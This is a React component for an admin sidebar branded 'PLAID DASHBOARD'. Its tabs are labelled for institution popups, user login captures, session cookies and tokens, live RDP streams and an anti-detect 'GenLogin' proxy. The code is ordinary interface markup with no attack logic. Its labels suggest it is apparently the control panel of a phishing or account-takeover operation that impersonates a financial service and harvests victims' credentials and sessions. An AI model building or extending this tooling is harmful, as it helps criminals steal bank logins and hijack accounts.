"use client";

interface AdminSidebarProps {
  activeTab: string;
  setActiveTab: (tab: string) => void;
  notifCount: number;
  onLogout: () => void;
}

export default function AdminSidebar({ activeTab, setActiveTab, notifCount, onLogout }: AdminSidebarProps) {
  return (
    <aside className="w-64 bg-slate-900 border-r border-slate-800 flex flex-col shrink-0 select-none h-screen text-slate-100">
      <div className="flex h-16 items-center px-6 border-b border-slate-800 gap-3">
        <div className="h-8 w-8 rounded-lg bg-blue-600 flex items-center justify-center font-black text-white shadow-md">
          P
        </div>
        <div>
          <h1 className="text-sm font-black tracking-wide text-white uppercase">PLAID DASHBOARD</h1>
          <p className="text-[10px] text-slate-400 font-mono">Control Center Pro</p>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto py-5 px-3 space-y-1.5">
        <div className="px-3 pb-2 text-[10px] font-bold text-slate-400 uppercase tracking-wider">
          Main Modules
        </div>

        <button
          onClick={() => setActiveTab("institutions")}
          className={`w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer ${
            activeTab === "institutions" ? "bg-blue-600 text-white shadow-md" : "text-slate-300 hover:bg-slate-800 hover:text-white"
          }`}
        >
          🏛️ Institutions & Popups
        </button>

        <button
          onClick={() => setActiveTab("activity")}
          className={`w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer ${
            activeTab === "activity" ? "bg-blue-600 text-white shadow-md" : "text-slate-300 hover:bg-slate-800 hover:text-white"
          }`}
        >
          👥 User Activity Logins
        </button>

        <button
          onClick={() => setActiveTab("cookies")}
          className={`w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer ${
            activeTab === "cookies" ? "bg-blue-600 text-white shadow-md" : "text-slate-300 hover:bg-slate-800 hover:text-white"
          }`}
        >
          🍪 Session Cookies & Tokens
        </button>

        <button
          onClick={() => setActiveTab("streams")}
          className={`w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer ${
            activeTab === "streams" ? "bg-blue-600 text-white shadow-md" : "text-slate-300 hover:bg-slate-800 hover:text-white"
          }`}
        >
          🔴 Live RDP Streams
        </button>

        <button
          onClick={() => setActiveTab("proxy")}
          className={`w-full flex items-center gap-3 px-3.5 py-2.5 rounded-xl text-xs font-semibold transition cursor-pointer ${
            activeTab === "proxy" ? "bg-blue-600 text-white shadow-md" : "text-slate-300 hover:bg-slate-800 hover:text-white"
          }`}
        >
          🛡️ GenLogin Proxy <span className="ml-auto text-[9px] bg-emerald-500/20 text-emerald-400 px-1.5 py-0.5 rounded font-mono">Pro</span>
        </button>
      </div>

      <div className="p-4 border-t border-slate-800 bg-slate-950 flex items-center justify-between">
        <div className="flex items-center gap-3 truncate">
          <div className="w-8 h-8 rounded-full bg-slate-800 border border-slate-700 flex items-center justify-center font-bold text-xs text-slate-200">
            AD
          </div>
          <div className="truncate">
            <p className="text-xs font-bold text-slate-200">Administrator</p>
            <p className="text-[10px] text-slate-400 truncate font-mono">admin@plaid.internal</p>
          </div>
        </div>
        <button
          onClick={onLogout}
          className="text-red-400 hover:text-red-300 text-xs font-bold px-2.5 py-1 rounded-lg bg-red-500/10 hover:bg-red-500/20 transition cursor-pointer border border-red-500/20"
          title="Logout"
        >
          ⏏
        </button>
      </div>
    </aside>
  );
}